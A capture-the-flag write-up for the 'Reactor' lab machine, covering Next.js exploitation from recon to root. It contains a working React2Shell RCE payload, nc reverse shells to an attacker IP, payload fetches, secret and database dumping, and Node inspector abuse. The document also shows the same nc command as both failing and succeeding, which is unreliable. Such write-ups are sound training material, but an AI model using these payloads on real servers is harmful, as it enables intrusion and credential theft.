# Reactor: Easy

```sh
sudo vim /etc/hosts
# add reactor.htb

nmap -T4 -p- -A -Pn -v reactor.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
    * 3000/tcp: ppp

* the ```nmap``` scan shows that port 3000 is a webpage based on 'Next.js', as seen from the ```X-Powered-By``` header

* the webpage on port 3000 is titled 'ReactorWatch | Core Monitoring System', and the header contains version info: Core Monitoring System v3.2.1

* the website is for monitoring a reactor, and includes stats on the reactor: this does not give anything interesting

* the website gives us 3 names from its personnel:

    * Elena Rodriguez
    * Marcus Kim
    * James Thompson

* the Wappalyzer extension shows that the webpage is running on Next.js 15.0.3 and React frameworks

* web enum:

    ```sh
    feroxbuster -u http://reactor.htb:3000 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,js --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan with small wordlist

    ffuf -c -u 'http://reactor.htb:3000' -H 'Host: FUZZ.reactor.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 -fs 17175 -s
    # subdomain scan

    feroxbuster -u http://reactor.htb:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md,js --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan with medium wordlist
    ```

* directory scan using ```feroxbuster``` gives the following directories: which do not lead to anywhere:

    * /_next
    * /cgi-bin

* Googling for known exploits and vulnerabilities for Next.js 15.0.3 lead to a few vulnerabilities:

    * [CVE-2025-29927: middleware authorization bypass](https://github.com/aydinnyunus/CVE-2025-29927)
    * [CVE-2025-55182: React2Shell RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
    * [CVE-2025-66478: React server components RCE](https://www.huntress.com/threat-library/vulnerabilities/cve-2025-66478)

* we can check each of the vulnerabilities to see if any of them can be exploited

* testing for [CVE-2025-29927](https://github.com/aydinnyunus/CVE-2025-29927):

    ```sh
    # try accessing any protected routes using the 'middleware' header

    curl -H  "x-middleware-subrequest: middleware" http://reactor.htb:3000/_next

    curl -H  "x-middleware-subrequest: middleware" http://reactor.htb:3000/cgi-bin
    # both give 404 not found errors
    ```

* testing for [CVE-2025-55182 & CVE-2025-66478](https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/):

    ```sh
    sudo tcpdump -i tun0 icmp
    # setup listener for pings

    command="ping -c 3 10.10.14.66"
    # no spaces for Bash vars

    cat > payload.json <<EOF
    {
        "then": "\$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\\"then\\": \\"\$B0\\"}",
        "_response": {
            "_prefix": "process.mainModule.require('child_process').execSync('${command}');",
            "_formData": {
                "get": "\$1:constructor:constructor"
            }
        }
    }
    EOF

    echo -n '"$@0"' > payload2.txt

    curl -X POST http://reactor.htb:3000 -H "Next-Action: dontcare" -F "0=<payload.json" -F '1=<payload2.txt' --max-time 2 2>/dev/null || true
    # this works
    ```

* this works: we are able to exploit using the React2Shell POC, as we get ICMP packets from the attacker on our listener

* we can use the same method now to get a reverse shell:

    ```sh
    command="busybox nc 10.10.14.66 4444 -e sh"
    # revshell one-liner

    cat > payload.json <<EOF
    {
        "then": "\$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\\"then\\": \\"\$B0\\"}",
        "_response": {
            "_prefix": "process.mainModule.require('child_process').execSync('${command}');",
            "_formData": {
                "get": "\$1:constructor:constructor"
            }
        }
    }
    EOF

    cat payload.json
    # check the payload is correct

    echo -n '"$@0"' > payload2.txt

    nc -nvlp 4444
    # start listener

    curl -X POST http://reactor.htb:3000 -H "Next-Action: dontcare" -F "0=<payload.json" -F '1=<payload2.txt' --max-time 2 2>/dev/null || true
    # we get reverse shell
    ```

* in reverse shell:

    ```sh
    id
    # 'node' user

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # '/opt/reactor-app'

    ls -la
    # check for any secrets

    cat .env
    # discloses secrets

    which sqlite3
    # installed on target

    sqlite3 reactor.db .dump
    # dumps the DB file
    ```

* the ```/opt/reactor-app/.env``` file discloses the sensor API key 'rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k' and the SQLite DB path ```/opt/reactor-app/reactor.db```; it also mentions an alert webhook at 'https://alerts.internal.reactor.htb/webhook'

* on checking the DB file, we get MD5 password hashes for users 'admin' & 'engineer'

* using [crackstation](https://crackstation.net/) we are able to crack one of the hashes: giving the cleartext 'reactor1' for 'engineer' user

* we can enumerate the target further to see if this password can be re-used:

    ```sh
    ls -la /opt
    # we have two folders - 'reactor-app' and 'uptime-monitor'

    ls -la /

    ls -la /home
    # two users - 'engineer' and 'node'

    ls -la /home/node

    ls -la /home/engineer
    # permission denied
    ```

* we can try logging in as 'engineer' using the password found earlier:

    ```sh
    ssh engineer@reactor.htb
    # this works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # cannot run

    # check the other app in '/opt'

    ls -la /opt

    ls -la /opt/uptime-monitor
    # we have a JS file here

    cat /opt/uptime-monitor/worker.js
    ```

    ```js
    const http = require('http');
    const fs = require('fs');

    const TARGET_URL = 'http://127.0.0.1:3000/';
    const CSV_FILE = '/var/log/uptime-monitor.csv';
    const INTERVAL_MS = 30_000;
    const TIMEOUT_MS = 10_000;

    function csvEscape(value) {
        const s = String(value ?? '');
        return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
    }

    function record({ status, latency, size, error }) {
        const row = [
            new Date().toISOString(),
            status ?? '',
            latency ?? '',
            size ?? '',
            error ?? '',
        ]
            .map(csvEscape)
            .join(',') + '\n';

        fs.appendFileSync(CSV_FILE, row);
    }

    function probe() {
        const start = process.hrtime.bigint();
        let bytes = 0;

        const req = http.get(TARGET_URL, { timeout: TIMEOUT_MS }, (res) => {
            res.on('data', (chunk) => {
                bytes += chunk.length;
            });

            res.on('end', () => {
                const latencyMs = Number(
                    (process.hrtime.bigint() - start) / 1_000_000n
                );

                record({
                    status: res.statusCode,
                    latency: latencyMs,
                    size: bytes,
                });
            });
        });

        req.on('error', (error) => {
            const latencyMs = Number(
                (process.hrtime.bigint() - start) / 1_000_000n
            );

            record({
                latency: latencyMs,
                error: error.code || error.message,
            });
        });

        req.on('timeout', () => {
            req.destroy();

            record({
                latency: TIMEOUT_MS,
                error: 'TIMEOUT',
            });
        });
    }

    setInterval(probe, INTERVAL_MS);
    probe();

    console.log('uptime-monitor up, pid=' + process.pid);
    ```

    * the 'worker.js' file is for a uptime-monitor process tracker and stores its logs in ```/var/log/uptime-monitor.csv```

    * every 30 seconds, the script sends a request to 'http://localhost:3000', and measures the status code, latency, and errors/timeouts

* the uptime monitor script does not seem vulnerable, so we can check for other vectors

* we can try basic enum using ```linpeas``` - fetch script from attacker:

    ```sh
    wget http://10.10.14.66:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 6.8.0-117-generic, Ubuntu 24.04.4
    * 'engineer' user is part of multiple groups: 'adm', 'cdrom', 'dip', 'plugdev', 'lxd'
    * non-default process running: ```/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js```
    * local-only listener on port 9229
    * user group ```lxd``` is flagged

* we can first try the [lxd group exploit](https://juggernaut-sec.com/lxd-container/#Exloiting_LXD_%E2%80%93_Alpine_Container_Escape):

    ```sh
    # on attacker

    # build the alpine container image first
    git clone https://github.com/saghul/lxd-alpine-builder.git

    cd lxd-alpine-builder/

    sudo ./build-alpine
    # this creates '.tar.gz' images - we can select the latest one
    ```

    ```sh
    # on target
    
    # fetch the alpine image
    wget http://10.10.14.66:8000/alpine-v3.23-x86_64-20260528_0714.tar.gz

    lxc image import alpine-v3.23-x86_64-20260528_0714.tar.gz --alias alpine
    # this fails as the 'lxd' snap is not installed
    ```

* as the ```lxd``` component is not installed on the box, we can check for other privesc vectors

* Googling for the NodeJS ```--inspect``` flag shows that it is for the Node.js Inspector: a debugging interface to evaluate code and monitor runtime

* it also mentions that an exposed debugger, by default on port 9229, can lead to RCE

* we can follow this [hacktricks post for Node Inspector abuse](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.html):

    * to connect to the Inspector/Debugger, we need a Chromium-based browser: in this case we can use the Chromium web browser itself

    * navigate to the URL 'chrome://inspect': this leads to the DevTools config view

    * to access the port 9229 service, which is listening locally on the target, we need to port forward it first:

        ```sh
        ssh -L 1234:localhost:9229 engineer@reactor.htb
        # now we can access the debugger on attacker port 1234
        ```
    
    * next, in the Inspect config view, we can select the option 'Configure' for 'Discover network targets', and input the IP port value: 'localhost:1234'

    * this loads the remote target details, which mentions the file ```/opt/uptime-monitor/worker.js```

    * now, we can click on the 'inspect' option under it: which opens a new DevTools window with the console

    * now, we can use the NodeJS reverse-shell one-liner here for RCE:

        ```sh
        # on attacker

        nc -nvlp 5555
        # setup listener
        ```

        ```sh
        # in DevTools inspect console

        process.mainModule.require('child_process').exec('nc -e sh 10.10.14.66 5555')
        # this does not work, but the ping command works
        
        # try another revshell command

        process.mainModule.require('child_process').exec('nc -e sh 10.10.14.66 5555')
        # this works
        ```
    
    * we have reverse shell now:

        ```sh
        id
        # root

        cat /root/root.txt
        # root flag
        ```
